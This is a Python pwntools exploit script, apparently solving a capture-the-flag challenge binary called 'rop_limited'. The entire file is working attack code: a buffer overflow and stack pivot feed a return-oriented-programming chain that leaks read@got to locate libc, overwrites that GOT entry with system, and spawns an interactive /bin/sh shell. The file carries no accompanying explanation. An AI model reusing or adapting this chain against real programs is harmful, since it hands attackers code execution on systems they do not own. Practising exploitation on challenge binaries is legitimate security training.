from pwn import *

binary = "rop_limited"

context.log_level = 'error'
context.binary = binary
p = process(binary)
elf = ELF(binary)
libc = ELF("/usr/lib/libc.so.6") # from `ldd rop`

off = 0x30

pop_rdi = 0x0000000000401203
pop_rsi_r15 = 0x0000000000401201
pop_rdx = 0x000000000040113a
leave_ret = 0x0000000000401162

buf = 0x00404800

# read(0, buf, 0x100)
new_stack_read = p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(buf) + p64(0) + p64(pop_rdx) + p64(0x100) + p64(elf.plt['read'])

# write(1, read@got, 8)
leak_chain = p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(elf.got['read']) + p64(0) + p64(pop_rdx) + p64(8) + p64(elf.plt['write'])
# read(0, read@got, 8)
ow_got_chain = p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(elf.got['read']) + p64(0) + p64(pop_rdx) + p64(8) + p64(elf.plt['read'])
# read(buf) -> system("/bin/sh")
call_system_chain = p64(pop_rdi) + p64(buf + 8 * 19) + p64(elf.plt['read'])

chain = b"A" * off + p64(buf-8) + new_stack_read + p64(leave_ret)
p.send(chain + b" " * (0x80 - len(chain)))

chain = leak_chain + ow_got_chain + call_system_chain + b"/bin/sh\x00"
p.send(chain + b" " * (0x100 - len(chain)))

read_addr = u64(p.recv(8))
libc.address = read_addr - libc.symbols['read']

p.send(p64(libc.symbols['system']))

p.interactive()
